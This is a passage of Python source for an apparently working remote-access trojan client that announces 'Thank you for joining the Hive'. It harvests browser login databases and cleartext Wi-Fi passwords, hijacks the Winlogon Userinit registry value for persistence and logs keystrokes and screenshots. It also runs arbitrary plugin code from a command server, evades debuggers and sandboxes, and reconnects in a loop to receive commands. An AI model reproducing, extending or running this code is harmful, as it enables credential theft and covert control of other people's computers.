                "bytes_sent": psutil.net_io_counters().bytes_sent if psutil.net_io_counters() else 0,
                "bytes_recv": psutil.net_io_counters().bytes_recv if psutil.net_io_counters() else 0
            }
        
        return json.dumps(base_info, indent=2)
    except Exception as e:
        logger.error(f"Error getting detailed system info: {e}")
        return json.dumps({"error": str(e)})

# ========== ULTIMATE ADVANCED FEATURES ==========

def dump_process_memory(pid):
    """Dump process memory"""
    if not PSUTIL_AVAILABLE:
        return "error:psutil_not_available"
    
    try:
        proc = psutil.Process(int(pid))
        memory_info = proc.memory_info()
        
        memory_data = {
            "pid": pid,
            "rss": memory_info.rss,
            "vms": memory_info.vms,
            "memory_percent": proc.memory_percent(),
            "note": "Full memory dump requires platform-specific tools"
        }
        
        return json.dumps(memory_data)
    except psutil.NoSuchProcess:
        return json.dumps({"error": f"process_{pid}_not_found"})
    except Exception as e:
        logger.error(f"Error dumping memory: {e}")
        return json.dumps({"error": str(e)})

def harvest_credentials():
    """Harvest credentials from various sources"""
    global credential_cache
    
    try:
        credentials = {
            "browser_passwords": [],
            "wifi_passwords": [],
            "system_credentials": []
        }
        
        system = platform.system()
        if system == 'Windows':
            browser_paths = [
                (os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\Login Data'), 'Chrome'),
                (os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data\Default\Login Data'), 'Edge'),
            ]
        elif system == 'Linux':
            browser_paths = [
                (os.path.expanduser('~/.config/google-chrome/Default/Login Data'), 'Chrome'),
            ]
        else:
            browser_paths = []
        
        for path, browser in browser_paths:
            if os.path.exists(path):
                credentials["browser_passwords"].append({
                    "browser": browser,
                    "database": path,
                    "note": "SQLite database - requires decryption"
                })
        
        # WiFi passwords
        if system == 'Windows':
            try:
                result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'],
                                      capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    profiles = []
                    for line in result.stdout.split('\n'):
                        if 'All User Profile' in line or 'User Profile' in line:
                            profile_name = line.split(':')[1].strip()
                            profiles.append(profile_name)
                    
                    for profile in profiles[:10]:
                        try:
                            result = subprocess.run(['netsh', 'wlan', 'show', 'profile', f'name={profile}', 'key=clear'],
                                                  capture_output=True, text=True, timeout=5)
                            if 'Key Content' in result.stdout:
                                key_line = [l for l in result.stdout.split('\n') if 'Key Content' in l][0]
                                password = key_line.split(':')[1].strip()
                                credentials["wifi_passwords"].append({
                                    "ssid": profile,
                                    "password": password
                                })
                        except:
                            pass
            except:
                pass
        
        credential_cache = credentials
        return json.dumps(credentials)
    except Exception as e:
        logger.error(f"Error harvesting credentials: {e}")
        return json.dumps({"error": str(e)})

def add_multi_server(host, port):
    """Add server to multi-server list"""
    global multi_server_hosts
    
    try:
        server_info = {"host": host, "port": int(port)}
        if server_info not in multi_server_hosts:
            multi_server_hosts.append(server_info)
        return f"success:server_added:{host}:{port}"
    except Exception as e:
        return f"error:{str(e)}"

def switch_server():
    """Switch to next server in multi-server list"""
    global current_server_index, server_host, server_port
    
    if not multi_server_hosts:
        return "error:no_servers_configured"
    
    current_server_index = (current_server_index + 1) % len(multi_server_hosts)
    server_info = multi_server_hosts[current_server_index]
    server_host = server_info["host"]
    server_port = server_info["port"]
    return f"success:switched_to:{server_host}:{server_port}"

def queue_batch_commands(commands_json):
    """Queue batch of commands for execution"""
    global command_batch_queue
    
    try:
        commands = json.loads(commands_json)
        with batch_lock:
            command_batch_queue.extend(commands)
        return f"success:queued_{len(commands)}_commands"
    except Exception as e:
        return f"error:{str(e)}"

def execute_batch_commands():
    """Execute queued batch commands"""
    global command_batch_queue
    
    try:
        results = []
        with batch_lock:
            commands = command_batch_queue.copy()
            command_batch_queue = []
        
        for cmd in commands:
            try:
                result = execute_command(cmd)
                results.append({"command": cmd, "result": result})
            except Exception as e:
                results.append({"command": cmd, "result": f"error:{str(e)}"})
        
        return json.dumps(results)
    except Exception as e:
        return json.dumps({"error": str(e)})

def load_plugin(plugin_code):
    """Load and execute plugin code"""
    global plugin_registry
    
    try:
        plugin_id = f"plugin_{int(time.time())}"
        plugin_namespace = {}
        exec(plugin_code, plugin_namespace)
        plugin_registry[plugin_id] = plugin_namespace
        return f"success:plugin_loaded:{plugin_id}"
    except Exception as e:
        logger.error(f"Error loading plugin: {e}")
        return f"error:{str(e)}"

def list_plugins():
    """List loaded plugins"""
    return json.dumps(list(plugin_registry.keys()))

def init_database(db_path="client_data.db"):
    """Initialize SQLite database"""
    global database_connection
    
    try:
        import sqlite3
        database_connection = sqlite3.connect(db_path, check_same_thread=False)
        cursor = database_connection.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                command TEXT,
                result TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                keystroke TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS screenshots (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                image_data BLOB
            )
        ''')
        
        database_connection.commit()
        return f"success:database_initialized:{db_path}"
    except Exception as e:
        logger.error(f"Error initializing database: {e}")
        return f"error:{str(e)}"

def save_to_database(table, data):
    """Save data to database"""
    global database_connection
    
    if not database_connection:
        return "error:database_not_initialized"
    
    try:
        import sqlite3
        cursor = database_connection.cursor()
        
        if table == "commands":
            cursor.execute('INSERT INTO commands (timestamp, command, result) VALUES (?, ?, ?)',
                         (datetime.now().isoformat(), data.get('command', ''), data.get('result', '')))
        elif table == "keylogs":
            cursor.execute('INSERT INTO keylogs (timestamp, keystroke) VALUES (?, ?)',
                         (datetime.now().isoformat(), data.get('keystroke', '')))
        elif table == "screenshots":
            cursor.execute('INSERT INTO screenshots (timestamp, image_data) VALUES (?, ?)',
                         (datetime.now().isoformat(), data.get('image_data', b'')))
        
        database_connection.commit()
        return "success:data_saved"
    except Exception as e:
        logger.error(f"Error saving to database: {e}")
        return f"error:{str(e)}"

def query_database(query):
    """Execute database query"""
    global database_connection
    
    if not database_connection:
        return json.dumps({"error": "database_not_initialized"})
    
    try:
        import sqlite3
        cursor = database_connection.cursor()
        cursor.execute(query)
        results = cursor.fetchall()
        
        columns = [description[0] for description in cursor.description] if cursor.description else []
        data = [dict(zip(columns, row)) for row in results]
        
        return json.dumps(data)
    except Exception as e:
        logger.error(f"Error querying database: {e}")
        return json.dumps({"error": str(e)})

def encrypt_file(file_path, key=None):
    """Encrypt file"""
    if not ENCRYPTION_AVAILABLE:
        return "error:encryption_not_available"
    
    try:
        from cryptography.fernet import Fernet
        
        if key:
            fernet = Fernet(key.encode())
        else:
            key = Fernet.generate_key()
            fernet = Fernet(key)
        
        file_path = os.path.expanduser(file_path)
        with open(file_path, 'rb') as f:
            data = f.read()
        
        encrypted = fernet.encrypt(data)
        
        encrypted_path = file_path + ".encrypted"
        with open(encrypted_path, 'wb') as f:
            f.write(encrypted)
        
        return json.dumps({"success": True, "encrypted_file": encrypted_path, "key": key.decode()})
    except Exception as e:
        logger.error(f"Error encrypting file: {e}")
        return json.dumps({"error": str(e)})

def decrypt_file(file_path, key):
    """Decrypt file"""
    if not ENCRYPTION_AVAILABLE:
        return "error:encryption_not_available"
    
    try:
        from cryptography.fernet import Fernet
        
        fernet = Fernet(key.encode())
        file_path = os.path.expanduser(file_path)
        
        with open(file_path, 'rb') as f:
            encrypted_data = f.read()
        
        decrypted = fernet.decrypt(encrypted_data)
        
        decrypted_path = file_path.replace(".encrypted", ".decrypted")
        with open(decrypted_path, 'wb') as f:
            f.write(decrypted)
        
        return json.dumps({"success": True, "decrypted_file": decrypted_path})
    except Exception as e:
        logger.error(f"Error decrypting file: {e}")
        return json.dumps({"error": str(e)})

def get_system_hardening_info():
    """Get system hardening and security configuration"""
    try:
        hardening = {
            "firewall": {},
            "antivirus": {},
            "updates": {},
            "users": {},
            "services": {}
        }
        
        system = platform.system()
        
        if system == 'Windows':
            try:
                result = subprocess.run(['netsh', 'advfirewall', 'show', 'allprofiles', 'state'],
                                      capture_output=True, text=True, timeout=5)
                hardening["firewall"]["status"] = "enabled" if "ON" in result.stdout else "disabled"
            except:
                pass
        
        av_processes = ['avast', 'avg', 'kaspersky', 'norton', 'mcafee', 'bitdefender', 'windows defender']
        if PSUTIL_AVAILABLE:
            detected_av = []
            for proc in psutil.process_iter(['name']):
                try:
                    proc_name = proc.info['name'].lower()
                    for av in av_processes:
                        if av in proc_name:
                            detected_av.append(proc_name)
                            break
                except:
                    pass
            hardening["antivirus"]["detected"] = detected_av
        
        if PSUTIL_AVAILABLE:
            users = [u.name for u in psutil.users()]
            hardening["users"]["active_users"] = users
        
        return json.dumps(hardening)
    except Exception as e:
        logger.error(f"Error getting hardening info: {e}")
        return json.dumps({"error": str(e)})

def create_advanced_persistence():
    """Create advanced persistence with multiple methods"""
    try:
        results = []
        system = platform.system()
        
        if system == 'Windows':
            try:
                startup_folder = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                os.makedirs(startup_folder, exist_ok=True)
                results.append("startup_folder_shortcut")
            except:
                pass
            
            if WINDOWS_REG_AVAILABLE:
                try:
                    key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
                    reg.SetValueEx(key, "Userinit", 0, reg.REG_SZ, f"{os.path.abspath(__file__)},C:\\Windows\\system32\\userinit.exe")
                    reg.CloseKey(key)
                    results.append("winlogon_registry")
                except:
                    pass
        
        return json.dumps({"persistence_methods": results})
    except Exception as e:
        logger.error(f"Error creating advanced persistence: {e}")
        return json.dumps({"error": str(e)})

def go_into_standby_mode():
    """Enter standby mode and attempt reconnection"""
    global is_running
    reconnect_interval = config.get('reconnect_interval', 30)
    logger.info("Client is now in standby mode, waiting for server...")
    
    while is_running:
        try:
            time.sleep(reconnect_interval)
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.settimeout(10)
            client_socket.connect((server_host, server_port))
            client_socket.settimeout(None)
            logger.info("Reconnected to the server")
            handle_server_commands(client_socket)
            try:
                client_socket.close()
            except:
                pass
        except socket.timeout:
            logger.debug("Connection timeout. Retrying...")
        except socket.error as e:
            logger.debug(f"Connection attempt failed: {e}. Retrying in {reconnect_interval} seconds...")
        except KeyboardInterrupt:
            logger.info("Client exiting...")
            is_running = False
            break
        except Exception as e:
            logger.error(f"Unexpected error during reconnection: {e}")
            time.sleep(reconnect_interval)

def client_program():
    """Main client program"""
    global startup_added
    
    # Setup logging first
    setup_logging(
        config.get('log_level', 'INFO'),
        config.get('log_file', 'client.log')
    )
    
    logger.info("=" * 50)
    logger.info("Client starting...")
    logger.info(f"Platform: {platform.system()} {platform.release()}")
    logger.info(f"Python: {sys.version}")
    
    # Validate server connection before proceeding
    if not validate_connection(server_host, server_port):
        logger.warning(f"Server {server_host}:{server_port} is not reachable. Will retry in standby mode.")
    else:
        logger.info(f"Server {server_host}:{server_port} is reachable")
    
    # Add to startup if enabled
    if config.get('startup_enabled', True) and not startup_added:
        try:
            if add_to_startup():
                startup_added = True
                logger.info("Added to system startup")
        except Exception as e:
            logger.warning(f"Could not add to startup: {e}")
    
    # Perform self-healing check
    self_heal()
    
    client_socket = None
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.settimeout(10)
        logger.info(f"Attempting to connect to {server_host}:{server_port}")
        client_socket.connect((server_host, server_port))
        client_socket.settimeout(None)
        logger.info("Connected to server successfully")
        
        # Send health check info
        health_info = client_health_check()
        send_message(client_socket, f"CLIENT:health:{json.dumps(health_info)}")
        
        handle_server_commands(client_socket)
    except socket.timeout:
        logger.warning("Connection timeout. Entering standby mode...")
        if client_socket:
            try:
                client_socket.close()
            except:
                pass
        go_into_standby_mode()
    except Exception as e:
        logger.error(f"Failed to connect to server: {e}")
        if client_socket:
            try:
                client_socket.close()
            except:
                pass
        go_into_standby_mode()

def check_anti_debugging():
    """Check for debugging tools and sandbox environments"""
    if not config.get('anti_debugging', True):
        return True
    
    try:
        # Check for debugger attachment
        if platform.system() == 'Windows':
            import ctypes
            if ctypes.windll.kernel32.IsDebuggerPresent():
                return False
        else:
            # Check /proc/self/status for TracerPid
            try:
                with open('/proc/self/status', 'r') as f:
                    for line in f:
                        if line.startswith('TracerPid:'):
                            if int(line.split()[1]) != 0:
                                return False
            except:
                pass
        
        # Check for common sandbox/VM indicators
        if PSUTIL_AVAILABLE:
            import psutil
            # Check CPU count (VMs often have few cores)
            if psutil.cpu_count() < 2:
                return False
            
            # Check memory (VMs often have limited RAM)
            mem = psutil.virtual_memory()
            if mem.total < 2 * 1024 * 1024 * 1024:  # Less than 2GB
                return False
        
        return True
    except Exception as e:
        logger.debug(f"Anti-debugging check error: {e}")
        return True  # Fail open

def apply_evasion_techniques():
    """Apply evasion techniques to avoid detection"""
    if not config.get('evasion_techniques', True):
        return
    
    try:
        # Randomize process name if possible
        if platform.system() == 'Windows':
            try:
                import ctypes
                import random
                fake_names = ['svchost.exe', 'explorer.exe', 'winlogon.exe', 'csrss.exe']
                # Note: Actual process renaming requires more complex techniques
                pass
            except:
                pass
        
        # Add random delays to avoid pattern detection
        import random
        time.sleep(random.uniform(0.1, 0.5))
    except Exception as e:
        logger.debug(f"Evasion techniques error: {e}")

def monitor_resources():
    """Monitor and limit resource usage"""
    if not PSUTIL_AVAILABLE:
        return
    
    try:
        import psutil
        process = psutil.Process()
        
        # Check CPU usage
        cpu_percent = process.cpu_percent(interval=0.1)
        max_cpu = config.get('resource_limit_cpu', 50)
        if cpu_percent > max_cpu:
            logger.warning(f"CPU usage {cpu_percent}% exceeds limit {max_cpu}%")
            time.sleep(0.5)  # Throttle
        
        # Check memory usage
        mem_info = process.memory_info()
        max_memory = config.get('resource_limit_memory', 512) * 1024 * 1024  # Convert to bytes
        if mem_info.rss > max_memory:
            logger.warning(f"Memory usage {mem_info.rss / 1024 / 1024:.1f}MB exceeds limit {max_memory / 1024 / 1024:.1f}MB")
    except Exception as e:
        logger.debug(f"Resource monitoring error: {e}")

def recover_from_error(error_func, max_retries=3):
    """Error recovery wrapper"""
    if not config.get('error_recovery', True):
        return error_func()
    
    for attempt in range(max_retries):
        try:
            return error_func()
        except Exception as e:
            if attempt < max_retries - 1:
                logger.warning(f"Error occurred, retrying ({attempt + 1}/{max_retries}): {e}")
                time.sleep(2 ** attempt)  # Exponential backoff
            else:
                logger.error(f"Error recovery failed after {max_retries} attempts: {e}")
                raise

def validate_connection(host, port):
    """Validate server connection before attempting"""
    try:
        test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_socket.settimeout(5)
        result = test_socket.connect_ex((host, port))
        test_socket.close()
        return result == 0
    except Exception as e:
        logger.debug(f"Connection validation error: {e}")
        return False

def client_health_check():
    """Perform client health check"""
    try:
        health_status = {
            'timestamp': datetime.now().isoformat(),
            'platform': platform.system(),
            'running': is_running,
            'resource_usage': {}
        }
        
        if PSUTIL_AVAILABLE:
            import psutil
            process = psutil.Process()
            health_status['resource_usage'] = {
                'cpu_percent': process.cpu_percent(interval=0.1),
                'memory_mb': process.memory_info().rss / 1024 / 1024,
                'threads': threading.active_count()
            }
        
        return health_status
    except Exception as e:
        logger.debug(f"Health check error: {e}")
        return {'status': 'error', 'error': str(e)}

def self_heal():
    """Attempt to self-heal client issues"""
    try:
        # Check if we're using too many resources
        if PSUTIL_AVAILABLE:
            import psutil
            process = psutil.Process()
            cpu_percent = process.cpu_percent(interval=0.1)
            mem_mb = process.memory_info().rss / 1024 / 1024
            
            max_cpu = config.get('resource_limit_cpu', 50)
            max_memory = config.get('resource_limit_memory', 512)
            
            if cpu_percent > max_cpu:
                logger.warning(f"High CPU usage detected ({cpu_percent}%), throttling...")
                time.sleep(1)
            
            if mem_mb > max_memory:
                logger.warning(f"High memory usage detected ({mem_mb:.1f}MB), attempting cleanup...")
                # Clear caches if possible
                global credential_cache
                if len(credential_cache) > 100:
                    credential_cache.clear()
        
        return True
    except Exception as e:
        logger.debug(f"Self-heal error: {e}")
        return False

if __name__ == '__main__':
    # Load configuration
    load_config()
    
    # Initialize with defaults if config not loaded
    if not server_host:
        server_host = DEFAULT_CONFIG['server_host']
        server_port = DEFAULT_CONFIG['server_port']
        setup_logging()
    else:
        setup_logging(
            config.get('log_level', 'INFO'),
            config.get('log_file', 'client.log')
        )
    
    # Apply anti-debugging checks
    if not check_anti_debugging():
        logger.warning("Debugging environment detected. Exiting.")
        if config.get('stealth_mode', False):
            # In stealth mode, just exit silently
            sys.exit(0)
        sys.exit(1)
    
    # Apply evasion techniques
    apply_evasion_techniques()
    
    # Validate configuration
    if not server_host or not server_port:
        logger.error("Invalid server configuration. Please check client_config.json")
        sys.exit(1)
    
    if not isinstance(server_port, int) or server_port < 1 or server_port > 65535:
        logger.error(f"Invalid server port: {server_port}")
        sys.exit(1)
    
    print("Thank you for joining the Hive, all Hail the Queen! (Enhanced Edition)")
    print(f"Connecting to {server_host}:{server_port}...")
    print(f"Features: Anti-debugging, Evasion, Resource Monitoring, Error Recovery, Health Checks")
    print("=" * 60)
    
    try:
        client_program()
    except KeyboardInterrupt:
        logger.info("Client interrupted by user")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)
        sys.exit(1)
